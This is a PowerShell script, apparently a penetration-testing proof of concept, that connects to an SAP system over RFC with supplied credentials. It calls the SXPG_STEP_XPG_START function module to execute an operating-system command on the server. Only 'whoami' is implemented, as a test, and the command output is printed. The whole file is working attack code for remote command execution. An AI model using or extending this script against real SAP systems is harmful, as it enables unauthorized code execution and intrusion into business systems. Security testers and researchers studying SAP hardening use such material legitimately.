  <#
    .Synopsis
      OS command execution via SXPG_STEP_XPG_START
      Only whoami command implemented as test
    .Description
      Calls SXPG_STEP_XPG_START Remote FM of an SAP system.
    .Author
      @jvis

  #>

  #-Function Load-NCo: Loads NCo libraries
     Function Load-NCo {

      $ScriptDir = $PsScriptRoot
      
      $Size = [System.IntPtr]::Size
        If ($Size -eq 4) {
        $Path = $ScriptDir + "\..\..\NCo_x86\"
      }
      ElseIf ($Size -eq 8) {
        $Path = $ScriptDir + "\..\..\NCo_x86_64\"
      }

      [Reflection.Assembly]::LoadFile($Path + "sapnco.dll") > $Null
      [Reflection.Assembly]::LoadFile($Path + "sapnco_utils.dll") > $Null

    }

   #-Function Get-Destination: Target and credential
    Function Get-Destination {

    # Set Parameters
    Param(
    [parameter(Mandatory = $true)]
    [alias("t")]
    [string]$target,

    [parameter(Mandatory = $true)]
    [alias("s")]
    [string]$sysnr,	
	
    [parameter(Mandatory = $true)]
    [alias("c")]
    [string]$client,
  
    [parameter(Mandatory = $true)]
    [alias("u")]
    [string]$username,
    
    [parameter(Mandatory = $true)]
    [string]$password = $( Read-Host -asSecureString "Input password" )
    )
    
    #-Connection parameters-------------------------------------------
        $cfgParams = New-Object SAP.Middleware.Connector.RfcConfigParameters
        $cfgParams.Add("NAME", "TEST")
        $cfgParams.Add("ASHOST", $target)
        $cfgParams.Add("SYSNR", $sysnr)
        $cfgParams.Add("CLIENT", $client)
        $cfgParams.Add("USER", $username)
        $cfgParams.Add("PASSWD", $password)

      Return [SAP.Middleware.Connector.RfcDestinationManager]::GetDestination($cfgParams)
     
     }        


  #-Function Get-RFC_FM: 
    Function Get-RFC-FM () {
      Load-NCo
      $destination = Get-Destination

      #-Metadata--------------------------------------------------------
      [SAP.Middleware.Connector.IRfcFunction]$rfcFunction =
        $destination.Repository.CreateFunction("SXPG_STEP_XPG_START")

      # Sets import parameter
        $rfcFunction.SetValue("EXTPROG", "whoami")
        $rfcFunction.SetValue("STDINCNTL", "R")
        $rfcFunction.SetValue("STDOUTCNTL", "M")
        $rfcFunction.SetValue("STDERRCNTL", "M")
        $rfcFunction.SetValue("TRACECNTL", "0")
        $rfcFunction.SetValue("TERMCNTL", "C")
        $rfcFunction.SetValue("TRACELEVEL", "0")
        $rfcFunction.SetValue("LONG_PARAMS", "")
        $rfcFunction.SetValue("CONNCNTL", "H")

		
      #-Calls function module
        $rfcFunction.Invoke($destination)

      #-Shows export parameters
        Write-Host "`r`n==== RESULTS ===`r`n"
        Write-Host $rfcFunction.GetValue("LOG")     
    }

#-Main

Get-RFC-FM

#-End
